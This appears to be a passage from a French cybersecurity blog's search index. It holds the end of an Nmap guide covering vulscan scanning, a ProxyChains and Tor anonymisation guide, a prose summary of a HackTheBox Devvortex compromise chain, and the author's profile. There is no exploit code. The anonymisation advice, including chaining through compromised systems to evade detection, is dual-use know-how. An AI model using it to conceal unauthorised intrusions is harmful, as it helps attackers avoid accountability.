d\u0026rsquo;Exécution #\rNmap permet d\u0026rsquo;ajuster certaines options pendant l\u0026rsquo;exécution, offrant une plus grande interactivité et réactivité :\nv / V : Augmente ou diminue le niveau de verbosité, permettant de contrôler la quantité d\u0026rsquo;informations affichées pendant le scan.\nd / D : Augmente ou diminue le niveau de débogage, fournissant plus ou moins de détails sur le processus interne de Nmap.\np / P : Active ou désactive la traçabilité des paquets, ce qui peut être utile pour observer le comportement des paquets envoyés.\n? : Affiche une aide interactive, offrant un accès rapide aux commandes et options disponibles.\nIX- Nmap Vulnscan #\rNmap inclut un ensemble de scripts Vulnscan qui analysent les versions des services détectées lors des scans. Ces scripts se réfèrent à une base de données hors ligne, contenant des informations cruciales sur les vulnérabilités potentielles associées aux versions de services identifiées.\nBases de Données Utilisées #\rLes scripts Vulnscan s\u0026rsquo;appuient sur plusieurs bases de données de vulnérabilités, que vous devez télécharger et ajouter au répertoire /usr/share/nmap/scripts/vulscan/ pour les utiliser efficacement. Voici les bases de données recommandées :\nScipvuldb.csv - http://www.scip.ch/en/?vuldb Cve.csv - http://cve.mitre.org Osvdb.csv - http://www.osvdb.org Securityfocus.csv - http://www.securityfocus.com/bid/ Securitytracker.csv - http://www.securitytracker.com Xforce.csv - http://xforce.iss.net Exploitdb.csv - http://www.exploit-db.com Openvas.csv - http://www.openvas.org Il est également nécessaire de télécharger les paquets des bases de données et de les ajouter à /usr/share/nmap/scripts/vulscan/.\nPour tirer parti de Nmap Vulnscan, vous pouvez utiliser les commandes suivantes :\nPour effectuer une analyse complète avec Vulnscan : sudo nmap -sV --script=vulscan \u0026lt;HOST\u0026gt; Pour utiliser une base de données spécifique : sudo nmap -sV --script=vulscan --script-args vulscandb=cve.csv \u0026lt;HOST\u0026gt; Ces commandes permettent de détecter les vulnérabilités connues sur les services en cours d\u0026rsquo;exécution sur l\u0026rsquo;hôte ciblé, facilitant ainsi l\u0026rsquo;évaluation de la sécurité.\nX- Accélérer l\u0026rsquo;analyse des services de Nmap x16 #\rSelon une étude publiée, il est possible d\u0026rsquo;accélérer considérablement l\u0026rsquo;analyse des services avec Nmap en ajustant certains paramètres dans le fichier de configuration /usr/share/nmap/nmap-service-probes. Pour ce faire, modifiez toutes les occurrences de totalwaitms à 300 millisecondes et de tcpwrappedms à 200 millisecondes.\nPar ailleurs, les sondes qui ne possèdent pas de valeur servicewaitms définie utilisent par défaut une valeur de 5000 millisecondes. Pour optimiser davantage les performances, vous pouvez soit attribuer des valeurs spécifiques à chacune des sondes, soit compiler Nmap vous-même en modifiant la valeur par défaut dans le fichier service_scan.h.\nSi vous préférez ne pas modifier les valeurs totalwaitms et tcpwrappedms dans /usr/share/nmap/nmap-service-probes, une autre solution consiste à adapter le code d\u0026rsquo;analyse de Nmap pour ignorer complètement ces valeurs lors de l\u0026rsquo;exécution.\nEn conclusion, Nmap est un outil essentiel pour les professionnels de la cybersécurité, et offre une vaste gamme de fonctionnalités pour l\u0026rsquo;analyse des réseaux, la détection des services et l\u0026rsquo;identification des vulnérabilités. En exploitant ses options flexibles et en ajustant les paramètres d\u0026rsquo;analyse, les utilisateurs peuvent non seulement accélérer le processus de découverte, mais également garantir une approche sécurisée. Que ce soit pour des audits de sécurité, des tests de pénétration ou le dépannage réseau, Nmap demeure un allié précieux dans la construction d\u0026rsquo;une infrastructure informatique robuste face à des menaces en constante évolution.\n","date":"23 September 2023","externalUrl":null,"permalink":"/posts/nmap-guide/","section":"Posts","summary":"Nmap, abréviation de \u003cem\u003eNetwork Mapper\u003c/em\u003e, est un outil polyvalent et puissant qui peux se montrer utile autant pour un particulier q\u0026rsquo;un professionnel de la sécurité informatique cherchant à analyser, explorer et sécuriser\u0026hellip;","title":"Nmap Guide","type":"posts"},{"content":"","date":"23 September 2023","externalUrl":null,"permalink":"/tags/proxychains/","section":"Tags","summary":"","title":"Proxychains","type":"tags"},{"content":"Dans le domaine de la cybersécurité et des tests de pénétration (pentesting), l\u0026rsquo;anonymat en ligne est crucial. Les professionnels de la cybersécurité utilisent des outils comme ProxyChains pour masquer leur identité et contourner les restrictions géographiques. ProxyChains permet de rediriger le trafic à travers une série de serveurs proxy, rendant le traçage de l\u0026rsquo;origine du trafic extrêmement difficile. Cet article explore en profondeur l\u0026rsquo;utilisation de ProxyChains, de son installation sur des distributions populaires comme Kali et Ubuntu, à son utilisation sur diverses plateformes, y compris Windows. Nous examinerons également ses différentes applications, allant de la simple confidentialité à des scénarios plus complexes impliquant SSH et Metasploit.\nTable des matières #\rIntroduction à ProxyChains Applications de ProxyChains en Cybersécurité Comparaison entre ProxyChains et ProxyChains-ng Installation de ProxyChains sur Kali Installation de ProxyChains sur Ubuntu Utilisation de ProxyChains Intégration de ProxyChains avec Tor Considérations pour l\u0026rsquo;utilisation de ProxyChains Conclusion Introduction à ProxyChains #\rAvant de plonger dans les détails de ProxyChains, il est important de comprendre le concept de proxy.\nQu\u0026rsquo;est-ce qu\u0026rsquo;un Proxy ? #\rUn proxy est un serveur intermédiaire qui agit comme une passerelle entre un utilisateur et Internet. Par exemple, lorsque vous visitez un site web comme google.com, au lieu d\u0026rsquo;envoyer directement les paquets au serveur de Google, vous les envoyez d\u0026rsquo;abord au proxy, qui les transmet ensuite à Google. Ce mécanisme permet au serveur de destination de voir les informations du proxy plutôt que celles de l\u0026rsquo;utilisateur, offrant ainsi une confidentialité accrue.\nQu\u0026rsquo;est-ce que ProxyChains ? #\rProxyChains améliore ce concept en utilisant plusieurs serveurs proxy en chaîne. Le trafic part de votre machine, passe par plusieurs serveurs proxy avant d\u0026rsquo;atteindre la destination finale, rendant le traçage de votre adresse IP d\u0026rsquo;origine beaucoup plus difficile. ProxyChains supporte l\u0026rsquo;intégration avec Tor, SOCKS et les proxys HTTP, permettant une flexibilité et une sécurité accrues lors de la navigation sur Internet. Il peut également être configuré pour fonctionner avec des applications telles que Nmap et SQLmap.\nApplications de ProxyChains en Cybersécurité #\rProxyChains est souvent utilisé dans le cadre de tests de pénétration ou de red teaming pour masquer l\u0026rsquo;origine du trafic et simuler des accès depuis différentes localisations ou adresses IP. En enchaînant plusieurs proxies, y compris des systèmes compromis, les red teamers peuvent mieux dissimuler leurs mouvements au sein d\u0026rsquo;un réseau, rendant leur détection plus difficile. De plus, il est possible de contourner des pare-feux restrictifs pour accéder à des ressources bloquées.\nComparaison entre ProxyChains et ProxyChains-ng #\rProxyChains-ng, ou \u0026ldquo;next generation\u0026rdquo;, est une version améliorée du projet ProxyChains. Il propose des fonctionnalités avancées et une meilleure compatibilité. ProxyChains-ng est un programme UNIX qui intercepte les fonctions libc liées au réseau dans des programmes liés dynamiquement via une DLL préchargée. Il redirige les connexions via des proxies SOCKS4a/5 ou HTTP et supporte uniquement le protocole TCP.\nInstallation de ProxyChains sur Kali #\rProxyChains-ng est préinstallé sur Kali. Pour vérifier son installation, entrez la commande:\nproxychains4 Installation de ProxyChains sur Ubuntu #\rProxyChains-ng n\u0026rsquo;est pas installé par défaut sur Ubuntu, mais peut être installé en suivant ces étapes :\nMettez à jour vos dépôts 😀 sudo apt update -y Installez ProxyChains-ng : sudo apt install proxychains4 Vérifiez l\u0026rsquo;installation en entrant : proxychains4 Utilisation de ProxyChains #\rPour utiliser ProxyChains, vous devez d\u0026rsquo;abord configurer le fichier de configuration de ProxyChains pour y ajouter vos proxies. Ouvrez le fichier de configuration avec un éditeur de texte :\nsudo nano /etc/proxychains4.conf Ajoutez vos proxies à la fin du fichier en utilisant le format \u0026lt;protocole\u0026gt; \u0026lt;IP\u0026gt; \u0026lt;port\u0026gt;. Vous pouvez également configurer la manière dont ProxyChains utilise la liste des proxies (chaînes dynamiques, strictes, round-robin, ou aléatoires).\nIntégration de ProxyChains avec Tor #\rTor (The Onion Router) permet une communication anonyme sur Internet en faisant transiter le trafic à travers plusieurs serveurs opérés par des bénévoles à travers le monde.\nUtilisation de Tor et ProxyChains #\rInstallation de Tor sudo apt install tor Démarrage du service Tor sudo service tor start Assurez-vous que le fichier de configuration de ProxyChains utilise le proxy SOCKS sur le port 9050 (port par défaut de Tor). Ensuite, lancez votre navigateur via ProxyChains :\nproxychains4 firefox Considérations pour l\u0026rsquo;utilisation de ProxyChains #\rPour maximiser l\u0026rsquo;anonymat avec ProxyChains, il est crucial de choisir des proxies fiables et anonymes situés dans différentes régions géographiques. Des listes de proxies gratuits sont disponibles sur des sites comme GitHub, mais il est recommandé de les tester régulièrement pour éviter les proxies défaillants. Des services payants comme Webshare offrent des proxies fiables et anonymes.\nConclusion #\rProxyChains est un outil puissant pour améliorer l\u0026rsquo;anonymat en ligne et contourner les restrictions géographiques. Que vous soyez un professionnel de la cybersécurité ou un utilisateur soucieux de sa confidentialité, ProxyChains offre une flexibilité et une sécurité accrues pour vos activités en ligne. Explorez ses différentes fonctionnalités pour voir comment il peut répondre à vos besoins.\nFoire Aux Questions #\rProxyChains est-il meilleur qu\u0026rsquo;un VPN ? #\rChaque solution a ses avantages. Les VPN encryptent votre trafic via un tunnel, tandis que ProxyChains redirige simplement le trafic à travers plusieurs proxies. Les VPN offrent un niveau de sécurité et de confidentialité plus élevé, mais pas nécessairement l\u0026rsquo;anonymat, puisque le fournisseur de VPN connaît votre identité.\nProxyChains est-il préinstallé sur Kali ? #\rOui, Kali inclut ProxyChains par défaut. Vous pouvez le vérifier avec la commande proxychains4.\nPourquoi les hackers utilisent-ils des serveurs proxy ? #\rLes hackers utilisent des serveurs proxy pour masquer leur adresse IP et leur localisation, rendant leur traçabilité difficile.\nQuelle est la différence entre Tor et ProxyChains ? #\rTor crypte le trafic entre chaque relais de son réseau, tandis que ProxyChains ne fournit pas de cryptage, comptant sur les serveurs proxy pour sécuriser le trafic.\n","date":"23 September 2023","externalUrl":null,"permalink":"/posts/proxychains/","section":"Posts","summary":"Dans le domaine de la cybersécurité et des tests de pénétration (pentesting), l\u0026rsquo;anonymat en ligne est crucial. Les professionnels de la cybersécurité utilisent des outils comme ProxyChains pour masquer leur identité et contourner les restrictions géographiques.","title":"Proxychains Guide","type":"posts"},{"content":"","date":"4 September 2023","externalUrl":null,"permalink":"/tags/hackthebox/","section":"Tags","summary":"","title":"HackTheBox","type":"tags"},{"content":"DevVortex est une machine Linux de niveau easy nécessitant un brute force DNS pour trouver un sous-domaine, suivi d\u0026rsquo;un brute force de répertoire qui mènera sur la découverte d\u0026rsquo;un dashboard admin Joomla obsolète dont l\u0026rsquo;exploitation permettra de trouver des identifiants de connexion. Le dashboard administrateur servira ensuite à éditer des fichiers PHP pour obtenir un reverse shell. Les mêmes identifiants de connexion, seront ensuite utilisés pour avoir accès à un hash MySQL, qu\u0026rsquo;on déchiffrera avec John. La connexion via SSH révèlera ensuite l\u0026rsquo;utilisation d\u0026rsquo;une ancienne version apport-cli, permettant l\u0026rsquo;exécution d\u0026rsquo;un shell root.\n","date":"4 September 2023","externalUrl":null,"permalink":"/posts/htb-devvortex/","section":"Posts","summary":"DevVortex est une machine Linux de niveau easy nécessitant un brute force DNS pour trouver un sous-domaine, suivi d\u0026rsquo;un brute force de répertoire qui mènera sur la découverte d\u0026rsquo;un dashboard admin \u003cstrong\u003eJoomla\u003c/strong\u003e obsolète\u0026hellip;","title":"HTB - Devvortex","type":"posts"},{"content":"","date":"4 September 2023","externalUrl":null,"permalink":"/tags/writups/","section":"Tags","summary":"","title":"Writups","type":"tags"},{"content":"","date":"13 June 2022","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"\rProfile Originally from Benin, I am currently a Cybersecurity student with a Bachelor of Science in Network Security. My journey in cybersecurity has taken me to exciting places, both professionally and personally. Presently, I work as a Network Security Administrator, where I also delve into penetration testing and actively participate in Hackthebox CTF challenges.\nInterests and Activities My passion for cybersecurity extends beyond my professional role. This blog is a space where I share my experiences, CTF write-ups, and IT-related content. I invite you to explore my posts and join me in the thrilling world of cybersecurity.\nAchievements Throughout my career, I have earned various IT badges, which reflect my commitment to continuously expanding my knowledge and skills. My GitHub profile is a testament to my contributions to the cybersecurity community, showcasing projects and tools I have developed.\nProjects and Tools • Secur\u0026hellip;.\n• Crypt\u0026hellip;.\nContact For business inquiries or to connect with me:\n• LinkedIn: Crispus Houessou\n• Twitter: @0xR4zn\nFeel free to reach out if you have any questions or if you\u0026rsquo;d like to discuss anything related to cybersecurity. Join me on this exciting journey as we navigate the ever-evolving world of cybersecurity together!\n","externalUrl":null,"permalink":"/about/","section":"Raizen | Blog","summary":"Profile Originally from Benin, I am currently a Cybersecurity student with a Bachelor of Science in Network Security. My journey in cybersecurity has taken me to exciting places, both professionally and personally.","title":"About","type":"page"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"}]